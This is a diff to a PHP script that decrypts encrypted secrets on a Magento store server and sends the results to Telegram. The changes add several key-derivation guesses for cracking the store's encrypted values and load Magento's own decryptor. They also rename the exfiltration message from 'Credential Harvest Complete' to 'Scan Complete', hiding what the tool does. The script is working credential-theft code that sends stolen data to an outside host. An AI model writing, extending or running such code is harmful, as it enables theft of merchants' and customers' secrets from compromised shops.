@@ -127,17 +127,47 @@ function standalone_sodium_decrypt($encrypted_full, $key) {
     $nonce = substr($payload, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
     $msg = substr($payload, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
     
-    $candidates = [$key, md5($key), substr($key, 0, 32)];
-    if (strlen($key) == 64 && ctype_xdigit($key)) $candidates[] = hex2bin($key);
+    // Build all possible key candidates
+    $candidates = [];
+    
+    // If key is 32 hex chars (16 bytes raw)
     if (strlen($key) == 32 && ctype_xdigit($key)) {
-        // Try HKDF derivation for hex keys
         $hex_bytes = hex2bin($key);
-        $hkdf = hash_hkdf('sha256', $hex_bytes, 32, '', '');
-        $candidates[] = $hkdf;
+        
+        // Method 1: HKDF with empty salt/info (Magento 2.4.0-2.4.3)
+        if (function_exists('hash_hkdf')) {
+            $candidates[] = hash_hkdf('sha256', $hex_bytes, 32, '', '');
+        }
+        
+        // Method 2: HKDF with salt = raw key (Magento 2.4.4+)
+        if (function_exists('hash_hkdf')) {
+            $candidates[] = hash_hkdf('sha256', $hex_bytes, 32, '', $key);
+        }
+        
+        // Method 3: Double the key
+        $candidates[] = $hex_bytes . $hex_bytes;
+        
+        // Method 4: Pad to 32 bytes
+        $candidates[] = str_pad($hex_bytes, 32, "\0");
+        
+        // Method 5: Use raw string as key material
+        if (function_exists('hash_hkdf')) {
+            $candidates[] = hash_hkdf('sha256', $key, 32, '', '');
+        }
     }
-
+    
+    // If key is 64 hex chars (32 bytes raw)
+    if (strlen($key) == 64 && ctype_xdigit($key)) {
+        $candidates[] = hex2bin($key);
+    }
+    
+    // Standard attempts
+    $candidates[] = $key;
+    $candidates[] = md5($key);
+    $candidates[] = substr($key, 0, 32);
+    
     foreach ($candidates as $k) {
-        if (strlen($k) !== SODIUM_CRYPTO_SECRETBOX_KEYBYTES) continue;
+        if (!is_string($k) || strlen($k) !== SODIUM_CRYPTO_SECRETBOX_KEYBYTES) continue;
         try {
             $pt = sodium_crypto_secretbox_open($msg, $nonce, $k);
             if ($pt !== false) return $pt;
@@ -154,6 +184,38 @@ function standalone_mcrypt_decrypt($value, $key) {
 
 function smart_decrypt($value, $keys) {
     if (!$value) return '';
+    
+    // Try using Magento's native decryption first (most reliable)
+    static $magento_encryptor = null;
+    if ($magento_encryptor === null) {
+        try {
+            // Try to load Magento bootstrap
+            $bootstrap_path = dirname(findEnvPhp()) . '/../../app/bootstrap.php';
+            if (file_exists($bootstrap_path)) {
+                require_once $bootstrap_path;
+                $bootstrap = \Magento\Framework\App\Bootstrap::create(BP, $_SERVER);
+                $obj = $bootstrap->getObjectManager();
+                $magento_encryptor = $obj->get('\Magento\Framework\Encryption\EncryptorInterface');
+            }
+        } catch (Exception $e) {
+            // Magento bootstrap failed, use standalone methods
+            $magento_encryptor = false;
+        }
+    }
+    
+    // Use Magento's native decryptor if available
+    if ($magento_encryptor !== false && is_object($magento_encryptor)) {
+        try {
+            $decrypted = $magento_encryptor->decrypt($value);
+            if ($decrypted && $decrypted !== $value) {
+                return $decrypted;
+            }
+        } catch (Exception $e) {
+            // Fall through to standalone methods
+        }
+    }
+    
+    // Fallback to standalone decryption
     foreach ($keys as $k) {
         if (strpos($value, ':3:') !== false) {
             $pt = standalone_sodium_decrypt($value, $k);
@@ -381,7 +443,7 @@ file_put_contents($outFile, $output);
 echo $output;
 
 // Send to Telegram
-send_telegram("✅ <b>Credential Harvest Complete</b>\n\nHost: $host_name\nFound: " . count($results) . " entries", $outFile);
+send_telegram("✅ <b>Scan Complete</b>\n\nHost: $host_name\nFound: " . count($results) . " entries", $outFile);
 
 echo "\nSaved to: $outFile\n";
 echo "Sent to Telegram!\n";
